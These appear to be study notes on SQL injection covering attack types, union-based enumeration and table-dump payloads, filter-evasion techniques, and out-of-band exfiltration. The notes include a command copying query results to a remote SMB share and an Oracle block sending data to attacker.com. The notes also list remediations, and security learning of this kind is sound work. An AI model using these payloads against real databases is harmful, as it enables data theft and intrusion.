 1SQL injection is an attack on a web application database server that causes malicious queries to be executed
# Types
## In-Band
in-band sql injection refers to the same method of communication being used to exploit the vulnerability and also receive the results 
### Error-based
This sql injection uses errors to determine the database structure and other things
### Union-based
This type of injection utilities the union operator to return additional results to the page
## Inferential (Blind) SQL injection
### Time based
using SLEEP() one can evaluate the time taken to respond to see if the command was successful
### Boolean based
The attacker sends a query to the database that would return a true or false, and infer whether the payload was successful from the response
## Out-of-band
out of band sql injection is used when the attacker cannot use the same channel to launch the attack and gather results or when the server responses are unstable
## Second-order SQL Injection
Second-order SQL injection, also known as stored SQL injection, exploits vulnerabilities where user-supplied input is saved and subsequently used in a different part of the application
It is much better at avoiding front-end defences like basic input validation or sanitation, since the payload does not cause disruption on its first step
# Gaining information
## Column number
by using union and increasingly larger selects to determine the column size
```sql
union select 1,...,n
```
## Database name
using database() function you can work out what the database is
```sql
(some value that wont come up) union select 1,...,database()
```
## Table names
using information_schema.tables you can get the tables of the database
```sql
(some value that wont come up) union select 1,...,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database name'
```
## Column names
using information_schema.columns you can get the tables of the database
```sql
(some value that wont come up) union select 1,...,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'table name'
```
## Table dump
```sql
(some value that wont come up) UNION SELECT 1,...,group_concat(column1,':',column2 SEPARATOR '<br>') FROM table_name
```
# Remediation
- Prepared queries ensure the sql code structure does not change when the parameters are added
- Input validation makes sure unauthorised commands are not injected
- Escaping user input stops users entering stuff like ' and " from affecting sql code
- least privilege principles to avoid allowing breaches to be so detrimental
- stored procedures must be validated and sanatised
- regular security audits and code reviews
# Evading filtering
## Character encoding
- URL encoding may pass through the initial web applications filters and get decoded by the database
- Hexadecimal encoding can be used to represent characters as numbers such that they can bypass filters
- Unicode encoding can represent characters with their respective escape sequences
- Alternatives to key words such as || for OR or && for AND can sometimes bypass this NOTE YOU COULD ALSO TRY CASE CHANGING
## No-Quote SQL Injection
- Numerical values can be used like in ids as no quotes are necessary
- SQL comments to end the rest of the statement to avoid filters and syntax errors
- CONCAT() also allows you to construct strings without quotes
## No spaces
- replace spaces with comments `/**/` to allow you to separate values NOTE THIS CAN ALSO BE PLACED IN THE MIDDLE OF STATEMENTS TO BYPASS THIS
- Tab or newline characters also can be used to seperate command
- url encoded characters such as htab, linefeed, formfeed, carriage return, and non-breaking space can be used
# Out of band SQL injection
Out of band injection allows attackers to ex -filtrate data without immediate feedback from the server. For instance, security mechanisms like stored procedures, output encoding, and application-level constraints can prevent direct responses, making traditional attacks ineffective. Out of band techniques bypass this by sending via DNS or HTTP requests circumventing these restrictions. Additionally IDS and WAFS often monitor and log suspicious activity, blocking direct responses from potentially malicious queries, by leveraging OOB channels, attackers can avoi dthis by using less scrutinized network protocols like DNS or SMB
## Tech
out of band SQL injections utilise the methodology of writing to another communication channel through a crafted query. each type of database may have differing commands to exfiltrate 
### MySQL and MariaDB
```MySQL
SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
```
### Microsoft SQL Server (MSSQL)
```SQL
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
```
### Oracle
```SQL
DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;
```
## Examples
### HTTP Requests
By leveraging database functions that allow HTTP requests, an attacker can send sensitive data directly to a web server they control
### DNS Exfiltration
Attackers can use SQL queries to generate DNS requests with encoded data, which is sent to a malicious DNS server controlled by the attacker
#### SMB Exfiltration
SMB exfiltration involves writing query results to an SMB share on an external server
## Preventions
`secure_file_priv` variable can restrict files to only be able to be written to the specified directory
# OTHER THINGIES
## HTTP HEADER INJECTIONEEE
sometimes the http header may be able to be injected such as user-agent, referer, or x-forwarded-for
## LE STORED PROCEDURES
stored procedures are precompiled SQL statements that can be executed as a single unit. They are stored in the database and can be called by applications to perform specific tasks, they themselves might be injectable
## XML AND JSON INJECT
applications that parse XML or JSON data and use the parted data in sql queries can be vulnerable to injection if they do not properly sanatise the inputs